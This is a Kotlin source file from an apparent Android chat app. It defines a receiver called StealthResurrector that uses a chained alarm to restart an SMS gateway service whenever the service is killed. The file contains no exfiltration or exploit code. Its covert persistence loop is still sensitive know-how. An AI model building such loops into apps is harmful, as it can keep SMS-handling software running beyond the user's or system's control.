package com.cornspace.aichat.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.cornspace.aichat.util.AppLogger

/**
 * StealthResurrector - BroadcastReceiver that keeps the resurrection loop alive.
 *
 * Each time the alarm fires this receiver:
 *  1. Restarts SmsGatewayService if it isn't already running.
 *  2. Schedules the next alarm via StealthCore.scheduleNextAlarm().
 *
 * FIX: Previously this receiver started StealthCore as a foreground Service,
 * which crashed on Android 8+ because StealthCore never called startForeground().
 * Since StealthCore is now a plain object, the alarm scheduling is done inline
 * here — no Service start required.
 */
class StealthResurrector : BroadcastReceiver() {

    companion object {
        private const val TAG = "StealthResurrector"
    }

    override fun onReceive(context: Context, intent: Intent) {
        AppLogger.d(TAG, "Resurrection alarm fired")
        try {
            // Restart the gateway service if it was killed.
            if (!SmsGatewayService.isServiceRunning()) {
                AppLogger.w(TAG, "SmsGatewayService not running — restarting")
                val serviceIntent = Intent(context, SmsGatewayService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }
            } else {
                AppLogger.d(TAG, "SmsGatewayService already running — no restart needed")
            }

            // Keep the chain alive by scheduling the next alarm.
            // This is the only place the loop perpetuates itself.
            StealthCore.scheduleNextAlarm(context)

        } catch (e: Exception) {
            AppLogger.e(TAG, "Error in resurrection receiver", e)
        }
    }
}